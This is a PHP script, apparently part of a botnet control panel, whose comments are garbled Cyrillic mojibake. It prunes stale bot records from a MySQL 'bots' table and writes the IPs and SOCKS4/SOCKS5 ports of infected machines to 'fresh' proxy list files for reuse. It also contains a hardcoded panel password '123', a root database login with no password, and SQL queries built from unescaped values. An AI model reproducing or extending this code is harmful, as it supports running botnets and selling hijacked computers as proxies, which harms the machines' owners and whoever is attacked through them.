<?php

//////////////////////////
/*
���� ������
1) ������� ����, ������ ������ �����
2) ������� ������ (����������) socks4 � ����
3) ������� ������ (����������) socks5 � ����
//////////////////////////
*/

/* ����� ��� ���������� ������ ����4/5 */
$socks4file = "socks4.fresh.txt";
$socks5file = "socks5.fresh.txt";

/* ������ ������� � ������� */
$password = "123";

/* MySQL */
$mysql_host = "localhost";
$mysql_user = "root";
$mysql_password = "";

/* ��� �� */
$mysql_dbname = "bots";

/* ��� ������� */
$mysql_bots_table = "bots";

/* ����� �������� ���������� �����.. ������� ���� ������ ��� � ���� */
$refreshtime = 15;

/* updates DB */
function db_update()
{
	GLOBAL $mysql_host, $mysql_user, $mysql_password, $mysql_dbname, $mysql_bots_table, $refreshtime;
	if (!@mysql_connect( $mysql_host, $mysql_user, $mysql_password ))
		return "Cannot connect to database";		
	mysql_select_db( $mysql_dbname );
	
	$r = mysql_query( "SELECT time, nickname FROM $mysql_bots_table" );
	while ($r && $arr = mysql_fetch_array( $r ))
	{
		$time = $arr["time"];
		$nickname = $arr["nickname"];
		if (time() - $time > $refreshtime)
			mysql_query( "DELETE FROM $mysql_bots_table WHERE nickname=\"$nickname\"" );
	}

	mysql_close();
	return "OK";
}

function db_savesocks4()
{
	GLOBAL $mysql_host, $mysql_user, $mysql_password, $mysql_dbname, $mysql_bots_table, $refreshtime, $socks4file;

	if (!@mysql_connect( $mysql_host, $mysql_user, $mysql_password ))
		return "Cannot connect to database";		
	mysql_select_db( $mysql_dbname );

	$f = fopen( $socks4file, "w" );

	$r = mysql_query( "SELECT ip,socks4 FROM $mysql_bots_table WHERE socks4" );
	$i = 0;
	while ($r && $arr = mysql_fetch_array( $r ))
	{
		$s4 = $arr["socks4"];
		$ip = $arr["ip"];
		fwrite( $f, "$ip:$s4\r\n" );
		$i++;
	}	

	fclose( $f );
	mysql_close();
	return $i;
}

function db_savesocks5()
{
	GLOBAL $mysql_host, $mysql_user, $mysql_password, $mysql_dbname, $mysql_bots_table, $refreshtime, $socks5file;

	if (!@mysql_connect( $mysql_host, $mysql_user, $mysql_password ))
		return "Cannot connect to database";		
	mysql_select_db( $mysql_dbname );

	$f = fopen( $socks5file, "w" );

	$r = mysql_query( "SELECT ip,socks5 FROM $mysql_bots_table WHERE socks5" );
	$i = 0;
	while ($r && $arr = mysql_fetch_array( $r ))
	{
		$s5 = $arr["socks5"];
		$ip = $arr["ip"];
		fwrite( $f, "$ip:$s5\r\n" );
		$i++;
	}	

	fclose( $f );
	mysql_close();
	return $i;
}

print "Updating DB...";
print db_update()."\n";
print "Saving $socks4file file...";
print "Saved ".db_savesocks4()." items\n";
print "Saving $socks5file file...";
print "Saved ".db_savesocks5()." items\n";

?>
